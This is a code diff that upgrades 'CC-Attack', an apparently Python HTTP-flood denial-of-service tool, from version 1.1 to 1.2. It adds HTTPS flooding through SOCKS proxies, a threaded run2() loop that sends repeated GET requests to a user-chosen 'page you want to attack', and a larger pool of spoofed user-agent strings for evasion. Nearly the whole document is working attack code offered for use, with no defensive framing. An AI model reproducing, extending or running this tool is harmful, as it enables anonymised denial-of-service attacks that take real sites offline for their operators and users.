@@ -7,6 +7,7 @@ import time
 import random
 import threading
 import sys
+import ssl
 
 print ('''
   ____ ____        _   _   _             _
@@ -14,7 +15,7 @@ print ('''
 | |  | |   _____ / _ \| __| __/ _` |/ __| |/ /
 | |__| |__|_____/ ___ \ |_| || (_| | (__|   <
  \____\____|   /_/   \_\__|\__\__,_|\___|_|\_\\
-Python3 version 1.1
+Python3 version 1.2 
                             Cobed by Leeon123
 >---------------------------------------------<
              If you want to stop
@@ -42,7 +43,6 @@ useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firef
 			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
 			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
 			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
 			"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
 			"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
 			"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
@@ -139,11 +139,25 @@ useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firef
 			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
 			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
 			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
-			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",]
+			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
+			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
+			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
+			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
+			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
+			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
+			"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
+			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
+			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
+			"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",]
 
 ip = str(input("> Host/Ip:"))
+https = str(input("> Https(y/n):"))
 url = str(input("> Page you want to attack:"))
-port = int(input("> Port:"))
+port = int(input("> Port(Https default is 443):"))
 thread_num = int(input("> Threads:"))
 out_file = str(input("> Proxy file path(proxy.txt):"))
 print ("> Number Of Proxies: %s" %(len(open(out_file).readlines())))
@@ -204,6 +218,47 @@ def run():
                 print ("<ERROR>----<socks down>")
                 s.close()
 
-for i in range(thread_num):
-    th = threading.Thread(target = run)
-    th.start()
+def run2():
+	get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+	connection = "Connection: Keep-Alive\r\n"
+	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+	accept = random.choice(acceptall)
+	request = get_host + useragent + accept + connection + "\r\n"
+	proxy = random.choice(proxies).strip().split(":")
+	while True:
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+				s = ssl.wrap_socket(socks.socksocket())
+				s.connect((str(ip), int(port)))
+				s.send(str.encode(request))
+				print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!")
+				try:
+					for y in range(multiple):
+						s.send(str.encode(request))
+				except:
+					s.close()
+			except:
+				s.close()
+				try:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+					s.connect((str(ip), int(port)))
+					s.send(str.encode(request))
+					print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!\r\n")
+					try:
+						for y in range(multiple):
+							s.send(str.encode(request))
+					except:
+						s.close()
+				except:
+					print ("<ERROR>----<socks down>")
+					s.close()
+					
+if https == "y":
+	for i in range(thread_num):
+		th = threading.Thread(target = run2)
+		th.start()
+else:
+	for i in range(thread_num):
+		th = threading.Thread(target = run)
+		th.start()
+	
